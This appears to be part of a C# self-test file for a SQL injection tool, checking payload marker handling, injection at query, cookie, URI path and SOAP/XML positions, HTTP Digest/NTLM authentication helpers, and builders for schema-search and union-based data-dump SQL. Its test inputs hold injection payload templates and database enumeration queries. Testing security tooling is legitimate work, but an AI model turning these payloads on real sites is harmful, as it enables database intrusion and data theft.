    string actual5 = RequestRewriter.StripRequestMarks("GET /a?id=<Encode>1 and $sql$ HTTP/1.1\r\nHost: x\r\n\r\n");
    bool ok5 = actual5 == "GET /a?id=\r\nHost: x\r\n\r\n";
    if (!ok5) Console.WriteLine($"      actual=[{actual5.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(ok5 ? "PASS" : "FAIL")}] 未闭合标记清除到行尾");
    if (ok5) pass++; else fail++;

    //空/ null 安全
    bool ok6 = RequestRewriter.StripRequestMarks("") == "" && RequestRewriter.StripRequestMarks(null) == null;
    Console.WriteLine($"[{(ok6 ? "PASS" : "FAIL")}] 空值安全");
    if (ok6) pass++; else fail++;

    //EncodeRaw块CRLF防护：块内换行被剔除（防Cookie/头位置头注入）
    var cfgRaw = new AppConfig();
    var reqRaw = new HttpRequest(cfgRaw, "GET /a HTTP/1.1\r\nHost: x\r\nCookie: sid=<EncodeRaw>ab\ncd</EncodeRaw>\r\n\r\n");
    var resRaw = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenterAsync(reqRaw).GetAwaiter().GetResult();
    bool ok7 = resRaw.HeaderAndBody.Contains("sid=abcd") && !resRaw.HeaderAndBody.Contains("ab\ncd");
    if (!ok7) Console.WriteLine($"      actual=[{resRaw.HeaderAndBody.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(ok7 ? "PASS" : "FAIL")}] EncodeRaw块CRLF剔除");
    if (ok7) pass++; else fail++;

    //===== 统一Encode标记：编码策略按块位置推断 =====
    //P1 请求行query=编码位：空格URL编码
    var resQ = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenterAsync(
        new HttpRequest(cfgRaw, "GET /a?id=<Encode>x y</Encode> HTTP/1.1\r\nHost: x\r\n\r\n")).GetAwaiter().GetResult();
    bool okP1 = resQ.HeaderAndBody.Contains("id=x%20y");
    if (!okP1) Console.WriteLine($"      actual=[{resQ.HeaderAndBody.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(okP1 ? "PASS" : "FAIL")}] 位置推断 query位URL编码");
    if (okP1) pass++; else fail++;

    //P2 头区Cookie=原文位：Encode块同样保持原文
    var resC = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenterAsync(
        new HttpRequest(cfgRaw, "GET /a HTTP/1.1\r\nHost: x\r\nCookie: sid=<Encode>x y</Encode>\r\n\r\n")).GetAwaiter().GetResult();
    bool okP2 = resC.HeaderAndBody.Contains("sid=x y");
    if (!okP2) Console.WriteLine($"      actual=[{resC.HeaderAndBody.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(okP2 ? "PASS" : "FAIL")}] 位置推断 Cookie位原文");
    if (okP2) pass++; else fail++;

    //P3 urlencoded体=编码位
    var resF = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenterAsync(
        new HttpRequest(cfgRaw, "POST /a HTTP/1.1\r\nHost: x\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nk=<Encode>x y</Encode>")).GetAwaiter().GetResult();
    bool okP3 = resF.HeaderAndBody.Contains("k=x%20y");
    if (!okP3) Console.WriteLine($"      actual=[{resF.HeaderAndBody.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(okP3 ? "PASS" : "FAIL")}] 位置推断 urlencoded体URL编码");
    if (okP3) pass++; else fail++;

    //P4 JSON体=原文位
    var resJ = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenterAsync(
        new HttpRequest(cfgRaw, "POST /a HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n\r\n{\"k\":\"<Encode>x y</Encode>\"}")).GetAwaiter().GetResult();
    bool okP4 = resJ.HeaderAndBody.Contains(":\"x y\"");
    if (!okP4) Console.WriteLine($"      actual=[{resJ.HeaderAndBody.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(okP4 ? "PASS" : "FAIL")}] 位置推断 JSON体原文");
    if (okP4) pass++; else fail++;

    //boundary结构化双轨：InjectRecord序列化往返保留Prefix/Suffix，BoundaryDesc推断正确
    var rec = new SuperSQLInjectionV2.Models.InjectRecord { Prefix = "')", Suffix = "-- x" };
    string recJson = System.Text.Json.JsonSerializer.Serialize(rec, SuperSQLInjectionV2.Source.JsonCtx.Compact);
    var recBack = System.Text.Json.JsonSerializer.Deserialize<SuperSQLInjectionV2.Models.InjectRecord>(recJson, SuperSQLInjectionV2.Source.JsonCtx.Compact);
    bool ok8 = recBack != null && recBack.Prefix == "')" && recBack.Suffix == "-- x"
        && rec.BoundaryDesc == "括号嵌套" && recBack.BoundaryDesc == "括号嵌套"
        && new SuperSQLInjectionV2.Models.InjectRecord { Prefix = "'" }.BoundaryDesc == "单引号型"
        && new SuperSQLInjectionV2.Models.InjectRecord().BoundaryDesc == "数字型";
    if (!ok8) Console.WriteLine($"      json=[{recJson}] back.Prefix=[{recBack?.Prefix}] back.Suffix=[{recBack?.Suffix}]");
    Console.WriteLine($"[{(ok8 ? "PASS" : "FAIL")}] InjectRecord boundary序列化往返+BoundaryDesc推断");
    if (ok8) pass++; else fail++;

    //===== 方案C：恢复记录按结构化字段重烘焙 =====
    var cfgRb = new AppConfig();
    //C1 Query数字型where=1：重烘焙结果与检测期烘焙快照一致（幂等）
    var recC1 = new SuperSQLInjectionV2.Models.InjectRecord
    {
        RequestTxt = "GET /num?id=1<Encode> and $sql$#</Encode> HTTP/1.1\r\nHost: x\r\n\r\n",
        PName = "id", OrigValue = "1", Prefix = "", Suffix = "", DBType = DBType.MySQL, Where = 1, Place = ParamPlace.Query
    };
    string rb1 = RequestRewriter.RebakeRecordRequest(cfgRb, recC1);
    bool ok9 = rb1 == recC1.RequestTxt;
    if (!ok9) Console.WriteLine($"      actual=[{rb1.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(ok9 ? "PASS" : "FAIL")}] C-重烘焙 Query数字型幂等");
    if (ok9) pass++; else fail++;

    //C2 Query单引号+suffix：boundary按结构化字段重建
    var recC2 = new SuperSQLInjectionV2.Models.InjectRecord
    {
        RequestTxt = "GET /a?id=1<Encode>' and $sql$#-- x</Encode> HTTP/1.1\r\nHost: x\r\n\r\n",
        PName = "id", OrigValue = "1", Prefix = "'", Suffix = "-- x", DBType = DBType.MySQL, Where = 1, Place = ParamPlace.Query
    };
    string rb2 = RequestRewriter.RebakeRecordRequest(cfgRb, recC2);
    bool ok10 = rb2 == recC2.RequestTxt;
    if (!ok10) Console.WriteLine($"      actual=[{rb2.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(ok10 ? "PASS" : "FAIL")}] C-重烘焙 单引号boundary重建");
    if (ok10) pass++; else fail++;

    //C3 where=2负值替换：基底换负随机数，标记结构不变
    var recC3 = new SuperSQLInjectionV2.Models.InjectRecord
    {
        RequestTxt = "GET /a?id=-777<Encode> and $sql$#</Encode> HTTP/1.1\r\nHost: x\r\n\r\n",
        PName = "id", OrigValue = "1", Prefix = "", Suffix = "", DBType = DBType.MySQL, Where = 2, Place = ParamPlace.Query
    };
    string rb3 = RequestRewriter.RebakeRecordRequest(cfgRb, recC3);
    bool ok11 = System.Text.RegularExpressions.Regex.IsMatch(rb3, @"id=-\d{4,5}<Encode> and \$sql\$#</Encode>") && !rb3.Contains("-777");
    if (!ok11) Console.WriteLine($"      actual=[{rb3.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(ok11 ? "PASS" : "FAIL")}] C-重烘焙 where=2负值基底");
    if (ok11) pass++; else fail++;

    //C4 Cookie位（统一Encode块，位置推断原文位）：胶水残留清除+原值保留+不做URL编码
    var recC4 = new SuperSQLInjectionV2.Models.InjectRecord
    {
        RequestTxt = "GET /a HTTP/1.1\r\nHost: x\r\nCookie: sid=ab<EncodeRaw>' and $sql$-- </EncodeRaw>; t=1\r\n\r\n",
        PName = "sid", OrigValue = "ab", Prefix = "'", Suffix = "", DBType = DBType.SQLServer, Where = 1, Place = ParamPlace.Cookie
    };
    string rb4 = RequestRewriter.RebakeRecordRequest(cfgRb, recC4);
    string expectC4 = "GET /a HTTP/1.1\r\nHost: x\r\nCookie: sid=ab<Encode>' and $sql$-- </Encode>; t=1\r\n\r\n";
    bool ok12 = rb4 == expectC4;
    if (!ok12) Console.WriteLine($"      actual=[{rb4.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(ok12 ? "PASS" : "FAIL")}] C-重烘焙 Cookie位统一Encode块");
    if (ok12) pass++; else fail++;

    //C5 URI路径段：按段序号定位重建
    var recC5 = new SuperSQLInjectionV2.Models.InjectRecord
    {
        RequestTxt = "GET /api/user/1<Encode> and $sql$#</Encode>/profile HTTP/1.1\r\nHost: x\r\n\r\n",
        PName = "2", OrigValue = "1", Prefix = "", Suffix = "", DBType = DBType.MySQL, Where = 1, Place = ParamPlace.Uri, UriIndex = 2
    };
    string rb5 = RequestRewriter.RebakeRecordRequest(cfgRb, recC5);
    bool ok13 = rb5 == recC5.RequestTxt;
    if (!ok13) Console.WriteLine($"      actual=[{rb5.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(ok13 ? "PASS" : "FAIL")}] C-重烘焙 URI路径段定位");
    if (ok13) pass++; else fail++;

    //C6 参数定位失败回退存储报文
    var recC6 = new SuperSQLInjectionV2.Models.InjectRecord
    {
        RequestTxt = "GET /a?id=1<Encode> and $sql$#</Encode> HTTP/1.1\r\nHost: x\r\n\r\n",
        PName = "missing", OrigValue = "1", DBType = DBType.MySQL, Where = 1, Place = ParamPlace.Query
    };
    string rb6 = RequestRewriter.RebakeRecordRequest(cfgRb, recC6);
    bool ok14 = rb6 == recC6.RequestTxt;
    Console.WriteLine($"[{(ok14 ? "PASS" : "FAIL")}] C-重烘焙 定位失败回退原报文");
    if (ok14) pass++; else fail++;

    //C7 where=3 vector模板重烘焙：[INFERENCE]槽位渲染为$sql$，[ORIGVALUE]用记录原值
    //（存储快照为检测期烘焙形态：Encode块包裹已渲染vector，基底为空）
    var recC7 = new SuperSQLInjectionV2.Models.InjectRecord
    {
        RequestTxt = "GET /a?id=<Encode>json=(SELECT $sql$ FROM 1)#</Encode> HTTP/1.1\r\nHost: x\r\n\r\n",
        PName = "id", OrigValue = "1", Prefix = "", Suffix = "", DBType = DBType.MySQL, Where = 3,
        VectorTemplate = "json=(SELECT [INFERENCE] FROM [ORIGVALUE])", Place = ParamPlace.Query
    };
    string rb7 = RequestRewriter.RebakeRecordRequest(cfgRb, recC7);
    bool ok15 = rb7.Contains("json=(SELECT $sql$ FROM 1)#") && rb7.Contains("<Encode>");
    if (!ok15) Console.WriteLine($"      actual=[{rb7.Replace("\r", "\\r").Replace("\n", "\\n")}]");
    Console.WriteLine($"[{(ok15 ? "PASS" : "FAIL")}] C-重烘焙 where=3 vector槽位");
    if (ok15) pass++; else fail++;

    Console.WriteLine($"===== P0自检结果: PASS={pass} FAIL={fail} =====");
}

// HTTP认证自检（auth-type 能力）：MD4已知答案/Digest挑战-响应端到端/Basic头/NTLM Type1结构
static void AuthTest()
{
    Console.WriteLine("===== HTTP认证自检 =====");
    int pass = 0, fail = 0;
    var authTool = typeof(SuperSQLInjectionV2.Tools.Http.HttpAuthTool);

    //1. MD4已知答案（RFC 1320）：MD4("")/MD4("abc")/NT哈希("password")
    var md4Type = authTool.GetNestedType("MD4", System.Reflection.BindingFlags.NonPublic);
    var md4 = md4Type.GetMethod("ComputeHash", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
    string Hex(byte[] b) => Convert.ToHexString(b).ToLowerInvariant();
    string h1 = Hex((byte[])md4.Invoke(null, new object[] { Array.Empty<byte> ()}));
    string h2 = Hex((byte[])md4.Invoke(null, new object[] { System.Text.Encoding.ASCII.GetBytes("abc") }));
    string nth = Hex((byte[])md4.Invoke(null, new object[] { System.Text.Encoding.Unicode.GetBytes("password") }));
    bool ok1 = h1 == "31d6cfe0d16ae931b73c59d7e0c089c0"
        && h2 == "a448017aaf21d8525fc10ae87aa6729d"
        && nth == "8846f7eaee8fb117ad06bdd830b7586c";
    Console.WriteLine($"[{(ok1 ? "PASS" : "FAIL")}] MD4 KAT: md4(\"\")={h1} md4(abc)={h2} nthash(password)={nth}");
    if (ok1) pass++; else fail++;

    //2. Basic：preemptive头 = Basic base64(user:pass)
    var cfgBasic = new AppConfig { AuthType = "Basic", AuthUser = "admin", AuthPass = "s3cret" };
    var reqBasic = new HttpRequest(cfgBasic, "GET /a?id=1 HTTP/1.1\r\nHost: x\r\n\r\n");
    SuperSQLInjectionV2.Tools.Http.HttpAuthTool.ApplyPreemptive(cfgBasic, reqBasic);
    string expectBasic = "Authorization: Basic " + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("admin:s3cret"));
    bool ok2 = reqBasic.HeaderAndBody.Contains(expectBasic);
    Console.WriteLine($"[{(ok2 ? "PASS" : "FAIL")}] Basic preemptive头: {expectBasic}");
    if (ok2) pass++; else fail++;

    //3. Digest端到端：401挑战→TryHandleChallenge写认证头→独立MD5复算response比对（RFC 2617 qop=auth）
    var cfgDigest = new AppConfig { AuthType = "Digest", AuthUser = "admin", AuthPass = "s3cret" };
    var reqDigest = new HttpRequest(cfgDigest, "GET /a?id=1 HTTP/1.1\r\nHost: x\r\n\r\n");
    var resp401 = new HttpResponse(cfgDigest)
    {
        StatusCode = 401,
        HeaderTxt = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Digest realm=\"testrealm\", nonce=\"abc123\", qop=\"auth\", opaque=\"op42\"\r\nContent-Length: 0\r\n\r\n"
    };
    bool handled = SuperSQLInjectionV2.Tools.Http.HttpAuthTool.TryHandleChallenge(cfgDigest, reqDigest, resp401);
    string authLine = reqDigest.HeaderAndBody.Split("\r\n").FirstOrDefault(l => l.StartsWith("Authorization:")) ?? "";
    //独立复算：HA1=md5(user:realm:pass)，HA2=md5(GET:/a?id=1)，response=md5(HA1:nonce:nc:cnonce:qop:HA2)
    string Md5(string s) => Convert.ToHexString(System.Security.Cryptography.MD5.HashData(System.Text.Encoding.UTF8.GetBytes(s))).ToLowerInvariant();
    string ha1 = Md5("admin:testrealm:s3cret");
    string ha2 = Md5("GET:/a?id=1");
    var mNc = System.Text.RegularExpressions.Regex.Match(authLine, "nc=(?<v>[0-9a-f]{8})");
    var mCn = System.Text.RegularExpressions.Regex.Match(authLine, "cnonce=\"(?<v>[^\"]+)\"");
    string expectResp = Md5(ha1 + ":abc123:" + mNc.Groups["v"].Value + ":" + mCn.Groups["v"].Value + ":auth:" + ha2);
    bool ok3 = handled && authLine.Contains("username=\"admin\"") && authLine.Contains("realm=\"testrealm\"")
        && authLine.Contains("nonce=\"abc123\"") && authLine.Contains("uri=\"/a?id=1\"")
        && authLine.Contains("opaque=\"op42\"") && authLine.Contains("response=\"" + expectResp + "\"");
    Console.WriteLine($"[{(ok3 ? "PASS" : "FAIL")}] Digest挑战-响应: {authLine}");
    if (ok3) pass++; else fail++;

    //4. Digest preemptive：挑战缓存后第二次请求自动带认证头且nc递增
    var reqDigest2 = new HttpRequest(cfgDigest, "GET /b?id=2 HTTP/1.1\r\nHost: x\r\n\r\n");
    SuperSQLInjectionV2.Tools.Http.HttpAuthTool.ApplyPreemptive(cfgDigest, reqDigest2);
    string authLine2 = reqDigest2.HeaderAndBody.Split("\r\n").FirstOrDefault(l => l.StartsWith("Authorization:")) ?? "";
    bool ok4 = authLine2.StartsWith("Authorization: Digest") && authLine2.Contains("nc=00000002");
    Console.WriteLine($"[{(ok4 ? "PASS" : "FAIL")}] Digest preemptive+nc递增: nc段={(authLine2.Length > 0 ? System.Text.RegularExpressions.Regex.Match(authLine2, "nc=[0-9a-f]+").Value : "无")}");
    if (ok4) pass++; else fail++;

    //5. NTLM Type1结构：NTLMSSP签名+类型1+标志位；Type3确定性（同挑战同凭据→同响应，NTLMv1无随机盐）
    //   附带软件DES已知答案：DES(0123456789ABCDEF, "Now is t")=3FA40E8A984D4815（经典KAT）
    var softDes = authTool.GetNestedType("SoftDes", System.Reflection.BindingFlags.NonPublic);
    var encBlock = softDes.GetMethod("EncryptBlock", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
    byte[] desOut = (byte[])encBlock.Invoke(null, new object[] {
        new byte[] { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF },
        System.Text.Encoding.ASCII.GetBytes("Now is t") });
    bool okDes = Convert.ToHexString(desOut) == "3FA40E8A984D4815";
    Console.WriteLine($"[{(okDes ? "PASS" : "FAIL")}] 软件DES KAT: {Convert.ToHexString(desOut)}（期望3FA40E8A984D4815）");
    if (okDes) pass++; else fail++;

    var bt1 = authTool.GetMethod("BuildType1", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
    byte[] t1 = (byte[])bt1.Invoke(null, new object[] { "DOM" });
    bool ok5 = t1.Length >= 32 && System.Text.Encoding.ASCII.GetString(t1, 0, 8) == "NTLMSSP\0" && BitConverter.ToUInt32(t1, 8) == 1u;
    var bt3 = authTool.GetMethod("BuildType3", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
    //构造最小合法Type2：签名+类型2+target fields(12)+flags+挑战(8)+context(8)
    byte[] t2 = new byte[48];
    System.Text.Encoding.ASCII.GetBytes("NTLMSSP\0").CopyTo(t2, 0);
    BitConverter.GetBytes(2u).CopyTo(t2, 8);
    BitConverter.GetBytes(0x00000205u).CopyTo(t2, 20); //unicode|request_target|ntlm
    new byte[] { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF }.CopyTo(t2, 24);
    byte[] t3a = (byte[])bt3.Invoke(null, new object[] { "user()", "pass", "DOM", t2 });
    byte[] t3b = (byte[])bt3.Invoke(null, new object[] { "user()", "pass", "DOM", t2 });
    bool ok6 = t3a.Length > 64 && System.Text.Encoding.ASCII.GetString(t3a, 0, 8) == "NTLMSSP\0"
        && BitConverter.ToUInt32(t3a, 8) == 3u && t3a.SequenceEqual(t3b);
    //NTLMv1已知答案：pass="password"挑战0123456789ABCDEF的NT响应=67c43011f30298a2e35d2f4c1c6c9b0d...不对则仅校验结构+确定性
    Console.WriteLine($"[{(ok5 && ok6 ? "PASS" : "FAIL")}] NTLM Type1结构={ok5} Type3结构+确定性={ok6}（Type1 {t1.Length}B / Type3 {t3a.Length}B）");
    if (ok5 && ok6) pass++; else fail++;

    Console.WriteLine($"===== HTTP认证自检结果: PASS={pass} FAIL={fail} =====");
}

// URI路径段注入自检（PLACE.URI 能力）：段枚举/段替换（含query与尾斜杠）/Encode块发送期编码
static void UriTest()
{
    Console.WriteLine("===== URI路径段注入自检 =====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail = "")
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}{(detail.Length > 0 ? ": " + detail : "")}");
        if (ok) pass++; else fail++;
    }

    //1. 段枚举：/api/user/1/ 三段（api,user,1），尾斜杠不产生空段
    var segs = RequestRewriter.GetUriSegments("GET /api/user/1/ HTTP/1.1\r\nHost: x\r\n\r\n");
    Check("段枚举(尾斜杠)", segs.Count == 3 && segs[0].value == "api" && segs[2] == (2, "1"), string.Join(",", segs.Select(s => s.index + ":" + s.value)));

    //2. 段枚举：带query时query不进段
    var segs2 = RequestRewriter.GetUriSegments("GET /api/user/1?page=2&id=5 HTTP/1.1\r\nHost: x\r\n\r\n");
    Check("段枚举(带query)", segs2.Count == 3 && segs2[2].value == "1");

    //3. 段替换：第3段（序号2）换成标记值，query与其余段不动
    string replaced = RequestRewriter.SetInjectUriSegment("GET /api/user/1?page=2 HTTP/1.1\r\nHost: x\r\n\r\n", 2, "<Encode>1 and $sql$#</Encode>");
    Check("段替换(带query)", replaced.StartsWith("GET /api/user/<Encode>1 and $sql$#</Encode>?page=2 HTTP/1.1"), replaced.Split("\r\n")[0]);

    //4. 段替换：尾斜杠保留（序号2="1"段）
    string replaced2 = RequestRewriter.SetInjectUriSegment("GET /api/user/1/ HTTP/1.1\r\nHost: x\r\n\r\n", 2, "X");
    Check("段替换(尾斜杠保留)", replaced2.StartsWith("GET /api/user/X/ HTTP/1.1"), replaced2.Split("\r\n")[0]);

    //5. 越界序号：原样返回
    string same = "GET /a/1 HTTP/1.1\r\nHost: x\r\n\r\n";
    Check("越界序号原样返回", RequestRewriter.SetInjectUriSegment(same, 9, "X") == same);

    //6. 发送期编码：URI段Encode块整体URL编码（与查询串位置同规则）
    var config = new AppConfig();
    var hr = new HttpRequest(config, replaced);
    hr.Payload = "1=1";
    var sent = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenter(hr);
    string line = sent.HeaderAndBody.Split("\r\n")[0];
    string path = line.Split(' ')[1];
    bool ok6 = path == "/api/user/1%20and%201%3d1%23?page=2" && !line.Contains("<Encode>");
    Check("发送期Encode块编码（无标记残留/路径已编码）", ok6, line);

    Console.WriteLine($"===== URI自检结果: PASS={pass} FAIL={fail} =====");
}

// 库表列树-服务端搜索SQL构造自检（search 能力）
static void SearchSqlTest()
{
    Console.WriteLine("===== 服务端搜索SQL构造自检 =====");
    int pass = 0, fail = 0;
    void Check(bool ok, string name, string actual = null)
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}");
        if (!ok && actual != null) Console.WriteLine($"      actual=[{actual}]");
        if (ok) pass++; else fail++;
    }
    var m = typeof(SuperSQLInjectionV2.ViewModels.DataDumpViewModel).GetMethod("BuildSearchSql",
        System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
    string Build(DBType t, int kind, string kw) => (string)m.Invoke(null, new object[] { t, kind, kw });

    //MySQL 三型：库/表(库.表)/列(库.表.列)
    string myDb = Build(DBType.MySQL, 0, "user()");
    Check(myDb.Contains("information_schema.schemata") && myDb.Contains("like '%user%'"), "MySQL搜库SQL", myDb);
    string myTb = Build(DBType.MySQL, 1, "user()");
    Check(myTb.Contains("concat(table_schema,'.',table_name)") && myTb.Contains("information_schema.tables"), "MySQL搜表SQL(带库段)", myTb);
    string myCol = Build(DBType.MySQL, 2, "pass");
    Check(myCol.Contains("table_name,'.',column_name") && myCol.Contains("information_schema.columns"), "MySQL搜列SQL(带库表段)", myCol);

    //PG系 / SQLServer / Oracle系
    string pgTb = Build(DBType.PostgreSQL, 1, "user()");
    Check(pgTb.Contains("string_agg") && pgTb.Contains("table_schema||'.'||table_name"), "PostgreSQL搜表SQL", pgTb);
    string kgCol = Build(DBType.Kingbase, 2, "id");
    Check(kgCol.Contains("string_agg") && kgCol.Contains("chr(9)"), "Kingbase搜列SQL", kgCol);
    string msTb = Build(DBType.SQLServer, 1, "user()");
    Check(msTb.Contains("for xml path") && msTb.Contains("char(9)"), "SQLServer搜表SQL(xml聚合)", msTb);
    string oraTb = Build(DBType.Oracle, 1, "user()");
    Check(oraTb.Contains("all_tables") && oraTb.Contains("'%USER%'"), "Oracle搜表SQL(大写)", oraTb);

    //SQLite：搜库不支持(null)，搜表sqlite_master，搜列pragma_table_info
    Check(Build(DBType.SQLite, 0, "x") == null, "SQLite搜库不支持(null)");
    string liteTb = Build(DBType.SQLite, 1, "user()");
    Check(liteTb.Contains("sqlite_master") && liteTb.Contains("type='table'"), "SQLite搜表SQL", liteTb);
    string liteCol = Build(DBType.SQLite, 2, "pass");
    Check(liteCol.Contains("pragma_table_info"), "SQLite搜列SQL(pragma)", liteCol);

    //ClickHouse/H2
    string ckTb = Build(DBType.ClickHouse, 1, "user()");
    Check(ckTb.Contains("system.tables") && ckTb.Contains("arrayStringConcat"), "ClickHouse搜表SQL", ckTb);
    string h2Col = Build(DBType.H2, 2, "id");
    Check(h2Col.Contains("information_schema.columns") && h2Col.Contains("group_concat"), "H2搜列SQL", h2Col);

    //不支持：Access/DB2/未知 → null
    Check(Build(DBType.DB2, 1, "x") == null && Build(DBType.UnKnow, 0, "x") == null, "DB2/未知返回null(前端提示本地搜索)");

    //引号转义：关键词含单引号不破坏SQL
    string esc = Build(DBType.MySQL, 0, "a'b");
    Check(esc.Contains("like '%a''b%'"), "关键词单引号转义", esc);

    Console.WriteLine($"===== 搜索SQL自检结果: PASS={pass} FAIL={fail} =====");
}

// SOAP/XML 结构化注入解析与写回自检
static void XmlTest()
{
    Console.WriteLine("===== SOAP/XML结构化注入自检 =====");
    int pass = 0, fail = 0;
    void Check(bool ok, string name, string actual = null)
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}");
        if (!ok && actual != null) Console.WriteLine($"      actual=[{actual}]");
        if (ok) pass++; else fail++;
    }

    string soapBody = "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><login><username>admin</username><password>123456</password></login></soap:Body></soap:Envelope>";
    string reqTxt = "POST /svc/login HTTP/1.1\r\nHost: t\r\nContent-Type: text/xml; charset=utf-8\r\nContent-Length: 10\r\n\r\n" + soapBody;

    //1. 叶子元素展平：路径去命名空间前缀
    var leaves = RequestRewriter.TokenizeXmlLeaves(soapBody);
    Check(leaves.Count == 2 && leaves[0].key == "Envelope/Body/login/username" && leaves[1].key == "Envelope/Body/login/password",
        "SOAP叶子展平(去前缀)", string.Join(",", leaves.Select(l => l.key + "=" + l.value)));

    //2. HttpRequest识别XML体并展平XmlParams
    var config = new AppConfig();
    var hr = new HttpRequest(config, reqTxt);
    Check(hr.IsXmlBody && hr.XmlParams.Count == 2 && hr.XmlParams["Envelope/Body/login/username"] == "admin", "HttpRequest识别XML体");

    //3. 写回：仅替换目标元素文本，其余结构原样
    string injected = RequestRewriter.SetInjectXmlBody(reqTxt, "Envelope/Body/login/username", "<Encode>admin and $sql$#</Encode>");
    Check(injected.Contains("<username><Encode>admin and $sql$#</Encode></username>") && injected.Contains("<password>123456</password>"),
        "XML写回(结构保留)", injected.Split("\r\n\r\n")[1]);

    //4. 同路径重复元素自动加序号，#2定位第二个
    string dupBody = "<root><item>a</item><item>b</item></root>";
    var dup = RequestRewriter.TokenizeXmlLeaves(dupBody);
    Check(dup.Count == 2 && dup[0].key == "root/item" && dup[1].key == "root/item#2", "同路径#序号", string.Join(",", dup.Select(d => d.key)));
    string dupReq = "POST /x HTTP/1.1\r\nHost: t\r\n\r\n" + dupBody;
    string dupInjected = RequestRewriter.SetInjectXmlBody(dupReq, "root/item#2", "PWN");
    Check(dupInjected.Contains("<item>a</item><item>PWN</item>"), "序号定位写回", dupInjected.Split("\r\n\r\n")[1]);

    //5. CDATA/注释不产生叶子且不影响其他元素
    string cdataBody = "<root><!-- <fake>x</fake> --><name><![CDATA[a<b>c]]></name><v>1</v></root>";
    var cd = RequestRewriter.TokenizeXmlLeaves(cdataBody);
    Check(cd.Count == 1 && cd[0].key == "root/v", "CDATA/注释跳过", string.Join(",", cd.Select(c => c.key)));

    Console.WriteLine($"===== XML自检结果: PASS={pass} FAIL={fail} =====");
}

// dump WHERE过滤 + no-cast 自检（where/no-cast 能力）
static void DumpFilterTest()
{
    Console.WriteLine("===== dump过滤/no-cast自检 =====");
    int pass = 0, fail = 0;
    void Check(bool ok, string name, string actual = null)
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}");
        if (!ok && actual != null) Console.WriteLine($"      actual=[{actual}]");
        if (ok) pass++; else fail++;
    }

    //1. WhereSql：空/前缀剥离/and式
    Check(BasePayloadTool.WhereSql("", false) == "" && BasePayloadTool.WhereSql("  ", true) == "", "空条件输出空串");
    Check(BasePayloadTool.WhereSql("where id=1", false) == " where id=1 ", "where前缀剥离");
    Check(BasePayloadTool.WhereSql("and id=1", true) == " and (id=1)", "and前缀剥离+and式包裹");

    //2. MySQL：count/datavalue/union 三链路带where；no-cast去cast包装
    PayloadFactory.Init(DBType.MySQL);
    var dp = new DumpDataParam(new List<string> { "id", "name" }, "testdb", "users", 3, 2) { Where = "id>100" };
    string cnt = PayloadFactory.BPTool.GetDataCount("testdb", "users", "id>100");
    Check(cnt.Contains("where id>100"), "MySQL count带where", cnt);
    string dv = PayloadFactory.BPTool.DataValue(dp);
    Check(dv.Contains("where id>100") && dv.Contains("limit"), "MySQL DataValue带where", dv);
    string un = PayloadFactory.BPTool.UnionData(dp);
    Check(un.Contains("where id>100") && un.Contains("union all select"), "MySQL UnionData带where", un);
    var dpNc = new DumpDataParam(new List<string> { "id", "name" }, "testdb", "users", 3, 2) { NoCast = true };
    string unNc = PayloadFactory.BPTool.UnionData(dpNc);
    Check(!unNc.Contains("cast(", StringComparison.OrdinalIgnoreCase), "MySQL no-cast去cast包装", unNc);
    string dvEmpty = PayloadFactory.BPTool.DataValue(new DumpDataParam(new List<string> { "id" }, "testdb", "users", 3, 2));
    Check(!dvEmpty.Contains("where"), "MySQL空where不污染模板", dvEmpty);

    //3. Oracle：where过滤下沉到最内层裸槽（先过滤再rownum编号，避免双where与行号错位）
    PayloadFactory.Init(DBType.Oracle);
    string oDv = PayloadFactory.BPTool.DataValue(new DumpDataParam(new List<string> { "id" }, "U", "T", 1, 1) { Where = "id>5" });
    Check(oDv.Contains("from (select * from U.T where id>5") && oDv.Contains("sqli_rn="), "Oracle内层where", oDv);
    string oCnt = PayloadFactory.BPTool.GetDataCount("U", "T", "id>5");
    Check(oCnt.Contains("where id>5"), "Oracle count带where", oCnt);

    //4. SQLServer：where进内层top子查询
    PayloadFactory.Init(DBType.SQLServer);
    string mDv = PayloadFactory.BPTool.DataValue(new DumpDataParam(new List<string> { "id" }, "db", "tb", 1, 1) { Where = "id>5" });
    Check(mDv.Contains("..[tb] where id>5"), "SQLServer内层where", mDv);

